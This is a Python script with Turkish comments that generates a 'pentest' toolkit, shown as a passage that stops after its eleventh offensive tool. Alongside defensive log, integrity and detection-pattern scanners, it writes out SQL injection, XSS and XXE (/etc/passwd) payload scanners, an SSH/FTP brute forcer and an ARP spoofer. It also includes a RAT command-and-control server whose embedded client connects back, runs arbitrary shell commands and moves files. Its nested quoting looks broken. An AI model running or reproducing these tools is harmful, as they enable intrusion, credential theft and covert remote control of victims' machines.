#!/usr/bin/env python3
# -*- coding: utf-8 -*-
# ============================================================
#  ETT - Etternetlog Tool Generator v2.0  |  29 Arac
#  Calistir: python3 ett_generator.py
#  Uretir : ~/etternetlog/  (cybersec 10 + pentest 12 + custom 7)
#  Not    : Root GEREKMEZ - gerekirse otomatik sudo kullanir.
# ============================================================
import os, sys, zipfile, subprocess, stat

BASE = os.environ.get("ETT_PATH") or os.path.expanduser("~/etternetlog")
ZIPF = BASE + ".zip"

# =================== CYBERSEC TOOLS (10) ===================
cybersec = {

"01_log_analyzer.py": r'''#!/usr/bin/env python3
"""Log Analyzer - Suspicious activity and error detection."""
import re, argparse, collections

PATTERNS = {
    "error": re.compile(r"ERROR|CRITICAL|FATAL", re.I),
    "failed_login": re.compile(r"Failed password|authentication failure|login failed", re.I),
    "sql_injection": re.compile(r"(%27)|(')|(--)|(%23)|(#)", re.I),
    "xss_attempt": re.compile(r"<script|javascript:|onerror=|onload=", re.I),
    "priv_escalation": re.compile(r"sudo|su -|chmod 777|chown root", re.I)
}

def analyze_log(filepath):
    results = collections.defaultdict(list)
    with open(filepath, "r", errors="ignore") as f:
        for i, line in enumerate(f, 1):
            for name, pat in PATTERNS.items():
                if pat.search(line):
                    results[name].append((i, line.strip()))
    return results

if __name__ == "__main__":
    p = argparse.ArgumentParser(description="Log Analyzer")
    p.add_argument("file")
    a = p.parse_args()
    res = analyze_log(a.file)
    print("[+] Toplam eslesme: %d" % sum(len(v) for v in res.values()))
    for cat, items in sorted(res.items()):
        print("\n[!] %s: %d eslesme" % (cat.upper(), len(items)))
        for no, line in items[:5]:
            print("   Satir %d: %s" % (no, line[:100]))
''',

"02_file_integrity_monitor.py": r'''#!/usr/bin/env python3
"""File Integrity Monitor - Detect unauthorized file changes."""
import hashlib, json, os, argparse

DB = ".fim_db.json"

def hash_file(path):
    h = hashlib.sha256()
    with open(path, "rb") as f:
        while chunk := f.read(8192):
            h.update(chunk)
    return h.hexdigest()

def scan(directory):
    db = {}
    for root, _, files in os.walk(directory):
        for fn in files:
            fp = os.path.join(root, fn)
            try: db[fp] = hash_file(fp)
            except Exception: pass
    return db

def check(directory):
    if not os.path.exists(DB):
        print("[+] Baseline olusturuluyor...")
        json.dump(scan(directory), open(DB, "w"), indent=2)
        return
    base = json.load(open(DB))
    cur = scan(directory)
    for f in cur:
        if f in base and base[f] != cur[f]: print("[CHANGED] %s" % f)
    for f in cur:
        if f not in base: print("[NEW] %s" % f)
    for f in base:
        if f not in cur: print("[MISSING] %s" % f)
    print("[+] Kontrol tamam.")

if __name__ == "__main__":
    p = argparse.ArgumentParser()
    p.add_argument("directory")
    a = p.parse_args()
    check(a.directory)
''',

"03_port_scanner_defensive.py": r'''#!/usr/bin/env python3
"""Defensive Port Scanner - Audit your own network."""
import socket, argparse, concurrent.futures

def scan_port(ip, port):
    try:
        with socket.socket(socket.AF_INET, socket.SOCK_STREAM) as s:
            s.settimeout(0.5)
            return port if s.connect_ex((ip, port)) == 0 else None
    except Exception:
        return None

def scan(ip, ports):
    print("[+] Taranıyor: %s" % ip)
    with concurrent.futures.ThreadPoolExecutor(100) as ex:
        results = list(ex.map(lambda pr: scan_port(ip, pr), ports))
    open_ports = [r for r in results if r]
    print("[+] Acik portlar: %s" % open_ports)

if __name__ == "__main__":
    p = argparse.ArgumentParser()
    p.add_argument("ip")
    p.add_argument("--ports", default="1-1024")
    a = p.parse_args()
    s_, e_ = map(int, a.ports.split("-"))
    scan(a.ip, range(s_, e_ + 1))
''',

"04_ssl_checker.py": r'''#!/usr/bin/env python3
"""SSL/TLS Certificate Checker."""
import ssl, socket, argparse, datetime

def check_ssl(hostname, port=443):
    ctx = ssl.create_default_context()
    try:
        with socket.create_connection((hostname, port), timeout=5) as sock:
            with ctx.wrap_socket(sock, server_hostname=hostname) as ssock:
                cert = ssock.getpeercert()
                exp = datetime.datetime.fromtimestamp(ssl.cert_time_to_seconds(cert["notAfter"]))
                days = (exp - datetime.datetime.utcnow()).days
                print("[+] Host: %s" % hostname)
                print("[+] Protokol: %s" % ssock.version())
                print("[+] Cipher: %s" % ssock.cipher()[0])
                print("[+] Bitis: %s (%d gun kaldi)" % (cert["notAfter"], days))
                print("[+] Subject: %s" % cert.get("subject"))
                if days < 30: print("[!] UYARI: Sertifika yakinda bitiyor!")
    except Exception as e:
        print("[!] Hata: %s" % e)

if __name__ == "__main__":
    p = argparse.ArgumentParser()
    p.add_argument("host")
    p.add_argument("--port", type=int, default=443)
    a = p.parse_args()
    check_ssl(a.host, a.port)
''',

"05_password_strength.py": r'''#!/usr/bin/env python3
"""Password Strength Checker."""
import re, argparse, math

def check(password):
    checks = {
        "length>=12": len(password) >= 12,
        "upper": bool(re.search(r"[A-Z]", password)),
        "lower": bool(re.search(r"[a-z]", password)),
        "digit": bool(re.search(r"\d", password)),
        "special": bool(re.search(r"[!@#$%^&*(),.?\":{}|<>]", password))
    }
    score = sum(checks.values())
    entropy = len(password) * math.log2(94) if password else 0
    print("[+] Skor: %d/5" % score)
    print("[+] Entropi: %.1f bit" % entropy)
    for k, v in checks.items():
        print("   %s %s" % ("[OK]" if v else "[FAIL]", k))
    if score < 3 or entropy < 40: print("[!] ZAYIF sifre")
    elif score < 5: print("[*] ORTA sifre")
    else: print("[+] GUCLU sifre")

if __name__ == "__main__":
    p = argparse.ArgumentParser()
    p.add_argument("password")
    a = p.parse_args()
    check(a.password)
''',

"06_yara_scanner.py": r'''#!/usr/bin/env python3
"""YARA Rule Scanner - File pattern matching."""
import argparse, os, re

RULES = {
    "suspicious_strings": [b"cmd.exe", b"powershell.exe", b"/bin/sh", b"eval("],
    "pe_header": re.compile(b"MZ"),
    "pdf_js": re.compile(b"/JavaScript|/JS", re.I)
}

def scan_file(fp):
    try:
        data = open(fp, "rb").read()
        hits = []
        for name, pat in RULES.items():
            if isinstance(pat, list):
                if any(p in data for p in pat): hits.append(name)
            elif pat.search(data):
                hits.append(name)
        return hits
    except Exception:
        return []

if __name__ == "__main__":
    p = argparse.ArgumentParser()
    p.add_argument("path")
    a = p.parse_args()
    for root, _, files in os.walk(a.path):
        for fn in files:
            fp = os.path.join(root, fn)
            m = scan_file(fp)
            if m: print("[MATCH] %s: %s" % (fp, m))
''',

"07_dns_security_check.py": r'''#!/usr/bin/env python3
"""DNS Security Checker - DNSSEC + MX + A (dnspython veya dig fallback)."""
import argparse, socket, subprocess

def main():
    p = argparse.ArgumentParser()
    p.add_argument("domain")
    a = p.parse_args()
    dom = a.domain
    print("[+] Kontrol: %s" % dom)
    try:
        print("[+] A: %s" % socket.gethostbyname(dom))
    except Exception as e:
        print("[!] A cozulemedi: %s" % e)
    try:
        import dns.resolver
        try:
            dns.resolver.resolve(dom, "DNSKEY")
            print("[+] DNSSEC: DNSKEY bulundu (DNSSEC aktif)")
        except Exception:
            print("[!] DNSSEC: DNSKEY bulunamadi")
        try:
            for m in dns.resolver.resolve(dom, "MX"):
                print("[+] MX: %s" % m)
        except Exception:
            pass
    except ImportError:
        r = subprocess.run(["dig", "+short", dom, "DNSKEY"], capture_output=True, text=True)
        print("[+] DNSSEC: DNSKEY bulundu" if r.stdout.strip() else "[!] DNSSEC: DNSKEY bulunamadi")
        r = subprocess.run(["dig", "+short", dom, "MX"], capture_output=True, text=True)
        for l in r.stdout.splitlines()[:5]: print("[+] MX: %s" % l)

if __name__ == "__main__":
    main()
''',

"08_ioc_scanner.py": r'''#!/usr/bin/env python3
"""IOC Scanner - Indicator of Compromise scanner."""
import argparse, os, json, hashlib, socket

def load(f):
    return json.load(open(f))

def main():
    p = argparse.ArgumentParser()
    p.add_argument("--ioc", required=True)
    p.add_argument("--path", default=".")
    a = p.parse_args()
    iocs = load(a.ioc)
    fnames = iocs.get("filenames", [])
    hashes = iocs.get("file_hashes", [])
    for root, _, files in os.walk(a.path):
        for fn in files:
            fp = os.path.join(root, fn)
            if any(f in fn for f in fnames):
                print("[IOC] Dosya adi: %s" % fp)
            try:
                h = hashlib.sha256(open(fp, "rb").read()).hexdigest()
                if h in hashes: print("[IOC] Hash: %s" % fp)
            except Exception:
                pass
    for ip in iocs.get("ip_addresses", []):
        try:
            socket.gethostbyname(ip)
            print("[RESOLVED] %s ulasilabilir (kotu amaçli olabilir)" % ip)
        except Exception:
            pass
    print("[+] Tarama tamam.")

if __name__ == "__main__":
    main()
''',

"09_honeypot.py": r'''#!/usr/bin/env python3
"""Simple TCP Honeypot - Logs connection attempts."""
import socket, argparse, datetime, threading

def handle(conn, addr, logfile):
    ts = datetime.datetime.now().isoformat()
    line = "[%s] Baglanti: %s" % (ts, addr)
    print(line)
    open(logfile, "a").write(line + "\n")
    try:
        conn.send(b"220 Welcome\n")
        data = conn.recv(1024)
        if data:
            line = "[%s] Veri: %s" % (ts, data.decode("utf-8", errors="ignore").strip())
            print(line)
            open(logfile, "a").write(line + "\n")
    except Exception:
        pass
    conn.close()

def start(port, logfile):
    s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
    s.setsockopt(socket.SOL_SOCKET, socket.SO_REUSEADDR, 1)
    s.bind(("0.0.0.0", port)); s.listen(5)
    print("[+] Honeypot dinliyor: port %d (log: %s)" % (port, logfile))
    while True:
        conn, addr = s.accept()
        threading.Thread(target=handle, args=(conn, addr, logfile), daemon=True).start()

if __name__ == "__main__":
    p = argparse.ArgumentParser()
    p.add_argument("--port", type=int, default=8080)
    p.add_argument("--log", default="honeypot.log")
    a = p.parse_args()
    start(a.port, a.log)
''',

"10_entropy_analyzer.py": r'''#!/usr/bin/env python3
"""File Entropy Analyzer - Detect encrypted/packed files."""
import math, os, argparse

def entropy(data):
    if not data: return 0
    e = 0.0
    for x in range(256):
        p = data.count(bytes([x])) / len(data)
        if p > 0: e += -p * math.log2(p)
    return e

if __name__ == "__main__":
    p = argparse.ArgumentParser()
    p.add_argument("directory")
    a = p.parse_args()
    for root, _, files in os.walk(a.directory):
        for fn in files:
            fp = os.path.join(root, fn)
            try:
                e = entropy(open(fp, "rb").read(8192))
                if e > 7.5: print("[HIGH %.2f] %s" % (e, fp))
            except Exception:
                pass
'''
}

# =================== PENTEST TOOLS (12) ===================
pentest = {

"01_port_scanner.py": r'''#!/usr/bin/env python3
"""Port Scanner - Fast threaded TCP scan with service detection."""
import socket, argparse
from concurrent.futures import ThreadPoolExecutor, as_completed

SERVICES = {21:"FTP",22:"SSH",23:"Telnet",25:"SMTP",53:"DNS",80:"HTTP",110:"POP3",
            135:"MS-RPC",139:"NetBIOS",143:"IMAP",443:"HTTPS",445:"SMB",993:"IMAPS",
            995:"POP3S",1433:"MSSQL",1521:"Oracle",2049:"NFS",3306:"MySQL",3389:"RDP",
            5432:"PostgreSQL",5900:"VNC",6379:"Redis",8080:"HTTP-Alt",8443:"HTTPS-Alt",
            27017:"MongoDB"}

def scan_port(ip, port):
    try:
        with socket.socket(socket.AF_INET, socket.SOCK_STREAM) as s:
            s.settimeout(1.0)
            return port if s.connect_ex((ip, port)) == 0 else None
    except Exception:
        return None

def banner(ip, port):
    try:
        with socket.create_connection((ip, port), timeout=3) as s:
            s.send(b"\r\n"); s.settimeout(3)
            return s.recv(100).decode(errors="replace").strip()[:80]
    except Exception:
        return ""

if __name__ == "__main__":
    p = argparse.ArgumentParser()
    p.add_argument("target")
    p.add_argument("--ports", default="1-1000")
    p.add_argument("--threads", type=int, default=200)
    a = p.parse_args()
    try:
        ip = socket.gethostbyname(a.target)
    except Exception:
        print("[!] Hedef cozumlenemedi"); sys.exit(1)
    ports = range(*[int(x) for x in a.ports.replace(",", "-").split("-")]) if "-" in a.ports \
            else [int(x) for x in a.ports.split(",")]
    ports = list(ports)
    print("[+] Taraniyor: %s (%s) - %d port" % (a.target, ip, len(ports)))
    open_ports = []
    with ThreadPoolExecutor(max_workers=a.threads) as ex:
        futs = {ex.submit(scan_port, ip, pr): pr for pr in ports}
        for f in as_completed(futs):
            r = f.result()
            if r:
                open_ports.append(r)
                print("  [+] %d/tcp  %s" % (r, SERVICES.get(r, "?")))
    open_ports.sort()
    print("\n[+] Acik portlar: %s" % open_ports)
    for pr in open_ports[:20]:
        b = banner(ip, pr)
        if b: print("  [i] %d banner: %s" % (pr, b))
''',

"02_sql_injection_scanner.py": r'''#!/usr/bin/env python3
"""SQL Injection Scanner - error/boolean/time based detection."""
import urllib.request, urllib.parse, urllib.error, argparse, time, re

ERRORS = [r"SQL syntax", r"mysql_fetch", r"ORA-[0-9]{5}", r"PostgreSQL.*ERROR",
          r"Unclosed quotation mark", r"Microsoft OLE DB", r"sqlite3\.OperationalError"]

PAYLOADS = ["'", '"', "' OR 1=1-- -", "' OR 1=2-- -", "1' AND '1'='1", "1' AND '1'='2",
            "' OR SLEEP(3)-- -", "'; WAITFOR DELAY '0:0:3'--", '" OR "1"="1',
            "' UNION SELECT NULL-- -"]

def test(url, param, pl, hd):
    q = urllib.parse.urlparse(url)
    params = [(k, pl if k == param else v) for k, v in urllib.parse.parse_qsl(q.query)]
    u = urllib.parse.urlunparse(q._replace(query=urllib.parse.urlencode(params)))
    try:
        r = urllib.request.urlopen(urllib.request.Request(u, headers=hd), timeout=8)
        return r.status, r.read(200000).decode(errors="replace")
    except urllib.error.HTTPError as e:
        return e.code, (e.read(50000).decode(errors="replace") if e.fp else "")

if __name__ == "__main__":
    p = argparse.ArgumentParser()
    p.add_argument("url")
    p.add_argument("--param", required=True)
    a = p.parse_args()
    hd = {"User-Agent": "Mozilla/5.0"}
    t0 = time.time()
    code, base = test(a.url, a.param, "1", hd)
    base_t = time.time() - t0
    print("[+] Taban: HTTP %d, %.2f sn, %d byte" % (code, base_t, len(base)))
    sizes = {}
    for pl in PAYLOADS:
        t0 = time.time()
        code, body = test(a.url, a.param, pl, hd)
        dt = time.time() - t0
        err = next((e for e in ERRORS if re.search(e, body, re.I)), None)
        mk = ""
        if err: mk = " [!] ERROR-BASED SQLi: %s" % err
        elif "SLEEP" in pl or "WAITFOR" in pl:
            if dt > base_t + 2: mk = " [!] TIME-BASED SQLi (%.1f sn)" % dt
        elif "1=1" in pl and "1=2" not in pl: sizes["eq"] = len(body)
        elif "1=2" in pl and "1=1" not in pl: sizes["neq"] = len(body)
        print("  [i] %-26s HTTP %d  %.1fs  %d byte%s" % (pl, code, dt, len(body), mk))
    if "eq" in sizes and "neq" in sizes and abs(sizes["eq"] - sizes["neq"]) > 50:
        print("[!] BOOLEAN-BASED SQLi suphesi: 1=1 (%d) vs 1=2 (%d) farkli" % (sizes["eq"], sizes["neq"]))
    print("[+] Tarama bitti. '[!]' isaretleri SQLi suphesi.")
''',

"03_xss_scanner.py": r'''#!/usr/bin/env python3
"""XSS Scanner - Reflected XSS detection."""
import urllib.request, urllib.parse, argparse

PAYLOADS = ["<script>alert(1)</script>", "<img src=x onerror=alert(1)>",
            "\"><svg/onload=alert(1)>", "'-alert(1)-'", "javascript:alert(1)",
            "<ScRiPt>alert(1)</sCrIpT>", "<iframe src=javascript:alert(1)>"]

if __name__ == "__main__":
    p = argparse.ArgumentParser()
    p.add_argument("url")
    p.add_argument("--param", required=True)
    a = p.parse_args()
    hd = {"User-Agent": "Mozilla/5.0"}
    for pl in PAYLOADS:
        q = urllib.parse.urlparse(a.url)
        params = [(k, pl if k == a.param else v) for k, v in urllib.parse.parse_qsl(q.query)]
        u = urllib.parse.urlunparse(q._replace(query=urllib.parse.urlencode(params)))
        try:
            r = urllib.request.urlopen(urllib.request.Request(u, headers=hd), timeout=8)
            body = r.read(200000).decode(errors="replace")
            if pl in body:
                print("[!] REFLECTED XSS: %s" % pl)
            else:
                print("[*] yansima yok: %s" % pl[:35])
        except Exception as e:
            print("[!] hata: %s" % e)
    print("[+] Tarama tamam.")
''',

"04_subdomain_enum.py": r'''#!/usr/bin/env python3
"""Subdomain Enumeration - wordlist + crt.sh CT log."""
import socket, argparse, json, urllib.request
from concurrent.futures import ThreadPoolExecutor, as_completed

WORDS = ["www","mail","ftp","admin","api","dev","test","staging","vpn","remote","portal",
         "intranet","webmail","blog","shop","m","mobile","support","help","status","cdn",
         "static","images","img","video","media","docs","wiki","forum","news","secure",
         "gateway","ns1","ns2","ns3","mx","smtp","pop","imap","mysql","db","sql","backup"]

def check(sub, dom):
    fqdn = "%s.%s" % (sub, dom)
    try:
        return fqdn, socket.gethostbyname(fqdn)
    except Exception:
        return None

def crtsh(dom):
    out = []
    try:
        req = urllib.request.Request("https://crt.sh/?q=%25.%s&output=json" % dom,
                                     headers={"User-Agent": "Mozilla/5.0"})
        data = json.loads(urllib.request.urlopen(req, timeout=20).read().decode())
        for e in data:
            for n in e.get("name_value", "").split("\n"):
                n = n.strip().lower()
                if n.endswith("." + dom) and "*" not in n and n not in out:
                    out.append(n)
    except Exception:
        pass
    return out

if __name__ == "__main__":
    p = argparse.ArgumentParser()
    p.add_argument("domain")
    a = p.parse_args()
    dom = a.domain.lower().strip(".")
    found = set()
    print("[+] DNS brute force (%d kelime)..." % len(WORDS))
    with ThreadPoolExecutor(50) as ex:
        futs = [ex.submit(check, w, dom) for w in WORDS]
        for f in as_completed(futs):
            r = f.result()
            if r:
                found.add(r)
                print("  [+] %s -> %s" % r)
    print("[+] crt.sh (CT logu) sorgusu...")
    for n in crtsh(dom):
        found.add((n, "CT"))
        print("  [+] %s (CT)" % n)
    print("\n[+] Toplam %d subdomain" % len(found))
''',

"05_directory_fuzzer.py": r'''#!/usr/bin/env python3
"""Directory Fuzzer - threaded web path discovery."""
import urllib.request, urllib.error, argparse
from concurrent.futures import ThreadPoolExecutor, as_completed

WORDS = ["admin","login","backup","bak","old","test","api","v1","v2","config","db","sql",
         "phpmyadmin","robots.txt","sitemap.xml",".git/HEAD",".env","server-status",
         "uploads","images","css","js","private","secret","tmp","data","files","docs",
         "README","index.php","index.html","web.config",".htaccess","xmlrpc.php",
         "wp-login.php","user","register","console","panel","cgi-bin","shell","upload",
         "filemanager","cron","status","health","swagger","api-docs","graphql","oauth",
         "token","keys","certs","logs","error","server","static","assets","vendor","src"]

def probe(base, word):
    u = base.rstrip("/") + "/" + word
    try:
        req = urllib.request.Request(u, headers={"User-Agent": "Mozilla/5.0"})
        r = urllib.request.urlopen(req, timeout=6)
        return word, r.status, len(r.read(10000))
    except urllib.error.HTTPError as e:
        if e.code in (200, 301, 302, 401, 403, 500):
            return word, e.code, 0
        return None
    except Exception:
        return None

if __name__ == "__main__":
    p = argparse.ArgumentParser()
    p.add_argument("url")
    p.add_argument("--threads", type=int, default=30)
    a = p.parse_args()
    found = []
    print("[+] %d yol deneniyor..." % len(WORDS))
    with ThreadPoolExecutor(max_workers=a.threads) as ex:
        futs = {ex.submit(probe, a.url, w): w for w in WORDS}
        for f in as_completed(futs):
            r = f.result()
            if r:
                found.append(r)
                print("  [+] /%-22s -> %d  (%d byte)" % (r[0], r[1], r[2]))
    print("\n[+] Toplam %d bulgu" % len(found))
''',

"06_wordpress_scanner.py": r'''#!/usr/bin/env python3
"""WordPress Security Scanner."""
import urllib.request, urllib.error, argparse, re

if __name__ == "__main__":
    p = argparse.ArgumentParser()
    p.add_argument("url")
    a = p.parse_args()
    base = a.url.rstrip("/")
    hd = {"User-Agent": "Mozilla/5.0"}
    for name, u in [("readme", base + "/readme.html"),
                    ("wp-login", base + "/wp-login.php"),
                    ("xmlrpc", base + "/xmlrpc.php"),
                    ("wp-config", base + "/wp-config.php"),
                    ("uploads", base + "/wp-content/uploads/")]:
        try:
            r = urllib.request.urlopen(urllib.request.Request(u, headers=hd), timeout=8)
            if name == "readme":
                body = r.read().decode("utf-8", errors="ignore")
                ver = re.search(r"Version (\d+\.\d+)", body)
                print("[!] WordPress surumu acikta: %s" % (ver.group(1) if ver else "bilinmiyor"))
            else:
                print("[!] Erisilebilir: %s -> HTTP %d" % (u, r.status))
        except urllib.error.HTTPError as e:
            if e.code == 403: print("[*] %s -> 403 (var ama engelli)" % u)
            else: print("[*] %s -> %d" % (u, e.code))
        except Exception:
            pass
    print("[+] Tarama tamam.")
''',

"07_hash_cracker.py": r'''#!/usr/bin/env python3
"""Hash Cracker - MD5/SHA1/SHA256 wordlist attack."""
import hashlib, argparse, sys, re

def detect(h):
    if re.fullmatch(r"[0-9a-fA-F]{32}", h): return "md5"
    if re.fullmatch(r"[0-9a-fA-F]{40}", h): return "sha1"
    if re.fullmatch(r"[0-9a-fA-F]{64}", h): return "sha256"
    return "?"

if __name__ == "__main__":
    p = argparse.ArgumentParser()
    p.add_argument("hash")
    p.add_argument("-w", "--wordlist", required=True)
    a = p.parse_args()
    h = a.hash.strip()
    algo = detect(h)
    if algo == "?":
        print("[!] Tespit edilemeyen hash (md5/sha1/sha256 desteklenir)"); sys.exit(1)
    print("[+] Algilandi: %s" % algo.upper())
    fn = {"md5": hashlib.md5, "sha1": hashlib.sha1, "sha256": hashlib.sha256}[algo]
    n = 0
    with open(a.wordlist, "r", errors="ignore") as f:
        for line in f:
            w = line.rstrip("\r\n")
            if not w: continue
            n += 1
            if fn(w.encode()).hexdigest().lower() == h.lower():
                print("[+] KIRILDI: %s (%d deneme)" % (w, n)); sys.exit(0)
            if n % 100000 == 0:
                sys.stdout.write("\r[*] %d deneme..." % n); sys.stdout.flush()
    print("\n[-] Bulunamadi (%d deneme)" % n)
''',

"08_ssh_bruteforce.py": r'''#!/usr/bin/env python3
"""SSH/FTP Brute Force - paramiko (ssh) veya hydra (ssh/ftp)."""
import argparse, sys, os

def ssh_brute(host, port, user, wl):
    try:
        import paramiko
    except ImportError:
        print("[!] paramiko yok: sudo pip install paramiko"); return
    with open(wl, errors="ignore") as f:
        for line in f:
            pw = line.strip()
            if not pw: continue
            try:
                c = paramiko.SSHClient()
                c.set_missing_host_key_policy(paramiko.AutoAddPolicy())
                c.connect(host, port=port, username=user, password=pw, timeout=5, banner_timeout=5)
                print("[+] GECERLI SIFRE: %s:%s" % (user, pw))
                c.close(); return
            except paramiko.AuthenticationException:
                pass
            except Exception as e:
                print("[!] baglanti hatasi: %s" % e); return
    print("[-] Wordlist'te gecerli sifre yok")

if __name__ == "__main__":
    p = argparse.ArgumentParser()
    p.add_argument("host")
    p.add_argument("--user", default="root")
    p.add_argument("-w", "--wordlist", required=True)
    p.add_argument("--proto", default="ssh", choices=["ssh", "ftp"])
    p.add_argument("--port", type=int, default=0)
    a = p.parse_args()
    if a.proto == "ssh":
        ssh_brute(a.host, a.port or 22, a.user, a.wordlist)
    else:
        if not os.path.exists(a.wordlist):
            print("[!] wordlist yok"); sys.exit(1)
        cmd = "hydra -l %s -P %s ftp://%s -t 4 -f" % (a.user, a.wordlist, a.host)
        print("[+] hydra calisiyor: %s" % cmd)
        os.system(cmd)
''',

"09_xxe_scanner.py": r'''#!/usr/bin/env python3
"""XXE (XML External Entity) Scanner."""
import urllib.request, urllib.error, argparse

PAYLOAD = """<?xml version="1.0"?>
<!DOCTYPE foo [<!ENTITY xxe SYSTEM "file:///etc/passwd">]>
<foo>&xxe;</foo>"""

if __name__ == "__main__":
    p = argparse.ArgumentParser()
    p.add_argument("url")
    a = p.parse_args()
    try:
        req = urllib.request.Request(a.url, data=PAYLOAD.encode(), headers={
            "Content-Type": "application/xml", "User-Agent": "Mozilla/5.0"})
        r = urllib.request.urlopen(req, timeout=10)
        body = r.read().decode("utf-8", errors="ignore")
        if "root:x:0:0" in body:
            print("[!] XXE acigi tespit edildi (/etc/passwd okunuyor)!")
        else:
            print("[+] Bariz XXE yok (yanit %d byte)" % len(body))
    except Exception as e:
        print("[!] Hata: %s" % e)
''',

"10_arp_spoofer.py": r'''#!/usr/bin/env python3
"""ARP Spoofer - MITM testing (root gerekirse otomatik sudo ile yeniden baslar)."""
import subprocess, sys, os, time, re, argparse

def main():
    p = argparse.ArgumentParser()
    p.add_argument("target_ip")
    p.add_argument("gateway_ip")
    p.add_argument("--iface", default="eth0")
    a = p.parse_args()
    if os.geteuid() != 0:
        print("[!] Root gerekli, sudo ile yeniden calistiriliyor...")
        sys.exit(subprocess.call(["sudo", "python3"] + sys.argv))
    if not os.path.exists("/usr/sbin/arpspoof") and not os.path.exists("/usr/bin/arpspoof"):
        print("[!] arpspoof yok: sudo apt install dsniff"); sys.exit(1)
    subprocess.run("sysctl -w net.ipv4.ip_forward=1", shell=True, capture_output=True)
    print("[+] IP forwarding acik. Spoofing basladi (Ctrl+C durdurur)...")
    procs = []
    try:
        procs.append(subprocess.Popen(["arpspoof", "-i", a.iface, "-t", a.target_ip, a.gateway_ip]))
        procs.append(subprocess.Popen(["arpspoof", "-i", a.iface, "-t", a.gateway_ip, a.target_ip]))
        for pr in procs: pr.wait()
    except KeyboardInterrupt:
        print("\n[!] Durduruldu")
        for pr in procs: pr.terminate()
        subprocess.run("sysctl -w net.ipv4.ip_forward=0", shell=True, capture_output=True)
        print("[+] IP forwarding kapatildi")

if __name__ == "__main__":
    main()
''',

"11_rat_server.py": r'''#!/usr/bin/env python3
"""RAT C2 Server - Authorized remote access testing framework.
Komutlar: agents | use <id> | shell <cmd> | upload <yerel> <uzak>
          download <uzak> <yerel> | quit
"""
import socket, threading, os, base64, argparse

def recv_exact(conn, n):
    buf = b""
    while len(buf) < n:
        c = conn.recv(n - len(buf))
        if not c: raise ConnectionError("baglanti kapandi")
        buf += c
    return buf

def recv_msg(conn):
    return recv_exact(conn, int.from_bytes(recv_exact(conn, 4), "big"))

def send_msg(conn, data):
    if isinstance(data, str): data = data.encode()
    conn.sendall(len(data).to_bytes(4, "big") + data)

class Agent:
    def __init__(self, cid, conn, addr):
        self.id, self.conn, self.addr = cid, conn, addr
        self.alive = True
        threading.Thread(target=self.listen, daemon=True).start()

    def listen(self):
        while self.alive:
            try:
                cmd = recv_msg(self.conn).decode("utf-8", "ignore")
                if cmd == "BYE":
                    self.alive = False
                elif cmd.startswith("RES:"):
                    print("  [%s] %s" % (self.id, cmd[4:][:500]))
                elif cmd == "PING":
                    print("  [%s] canli" % self.id)
            except Exception:
                self.alive = False
        try: self.conn.close()
        except Exception: pass
        print("  [-] Agent bitti: %s" % self.id)

    def send(self, cmd):
        try: send_msg(self.conn, cmd); return True
        except Exception: return False

def wait_agent(server, s):
    while True:
        conn, addr = s.accept()
        try:
            cid = recv_msg(conn).decode()
            send_msg(conn, "OK")
            a = Agent(cid, conn, addr)
            server[cid] = a
            print("[+] Agent baglandi: %s (%s) | toplam: %d" % (cid, addr[0], len(server)))
        except Exception:
            conn.close()

def main():
    p = argparse.ArgumentParser()
    p.add_argument("--port", type=int, default=4444)
    p.add_argument("--make-client", metavar="OUT", help="rat_client.py uret")
    a = p.parse_args()
    if a.make_client:
        CLIENT = '''#!/usr/bin/env python3
import socket, subprocess, os, base64, sys, threading
HOST, PORT = sys.argv[1] if len(sys.argv) > 1 else "127.0.0.1", int(sys.argv[2]) if len(sys.argv) > 2 else 4444
def recv_exact(c, n):
    b = b""
    while len(b) < n:
        d = c.recv(n - len(b))
        if not d: raise ConnectionError()
        b += d
    return b
def recv_msg(c): return recv_exact(c, int.from_bytes(recv_exact(c, 4), "big"))
def send_msg(c, d):
    if isinstance(d, str): d = d.encode()
    c.sendall(len(d).to_bytes(4, "big") + d)
def run(cmd):
    try:
        r = subprocess.run(cmd, shell=True, capture_output=True, text=True, timeout=30)
        return (r.stdout + r.stderr)[:4000] or "(cikti yok)"
    except Exception as e:
        return "hata: %s" % e
def main_loop():
    while True:
        try:
            c = socket.create_connection((HOST, PORT), timeout=8)
            send_msg(c, socket.gethostname())
            if recv_msg(c) != b"OK": continue
            while True:
                cmd = recv_msg(c).decode("utf-8", "ignore")
                if cmd == "quit": return
                if cmd.startswith("upload "):
                    _, name, data64 = cmd.split(" ", 2)
                    try:
                        open(name, "wb").write(base64.b64decode(data64))
                        send_msg(c, "RES:upload OK: %s" % name)
                    except Exception as e:
                        send_msg(c, "RES:upload HATA: %s" % e)
                elif cmd.startswith("download "):
                    name = cmd.split(" ", 1)[1]
                    try:
                        send_msg(c, "RES:" + base64.b64encode(open(name, "rb").read()).decode())
                    except Exception as e:
                        send_msg(c, "RES:download HATA: %s" % e)
                else:
                    send_msg(c, "RES:" + run(cmd))
        except Exception:
            time.sleep(5)
if __name__ == "__main__":
    import time
    main_loop()
'''
        open(a.make_client, "w").write(CLIENT)
        print("[+] Client uretildi: %s" % a.make_client)
        print("[*] Kullanim: python3 rat_client.py <C2_IP> <PORT>")
        return
    server = {}
    s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
    s.setsockopt(socket.SOL_SOCKET, socket.SO_REUSEADDR, 1)
    s.bind(("0.0.0.0", a.port)); s.listen(10)
    print("[+] RAT C2 dinliyor: 0.0.0.0:%d" % a.port)
    print("[*] Komutlar: agents | use <id> | shell <cmd> | upload <dosya> <uzak> | download <uzak> <yerel> | quit")
    threading.Thread(target=wait_agent, args=(server, s), daemon=True).start()
    cur = None
    while True:
        try:
            cmd = input("C2> ").strip()
        except (EOFError, KeyboardInterrupt):
            break
        if cmd == "quit": break
        if cmd == "agents":
            for i, (cid, ag) in enumerate(server.items(), 1):
                print("  [%d] %s  (%s)" % (i, cid, ag.addr[0]))
        elif cmd.startswith("use "):
            cid = cmd[4:].strip()
            cur = server.get(cid)
            print("[+] Secili: %s" % (cid if cur else "YOK"))
        elif cmd.startswith("shell ") and cur:
            cur.send("shell " + cmd[6:])
        elif cmd.startswith("upload ") and cur:
            parts = cmd.split()
            if len(parts) >= 3 and os.path.exists(parts[1]):
                data64 = base64.b64encode(open(parts[1], "rb").read()).decode()
                cur.send("upload %s %s" % (parts[2], data64))
            else: print("[!] yerel dosya yok")
        elif cmd.startswith("download ") and cur:
            cur.send("download " + cmd[9:])
        else:
            print("[!] Bilinmeyen komut / agent secili degil")
    print("[+] C2 kapandi")

if __name__ == "__main__":
    main()
''',
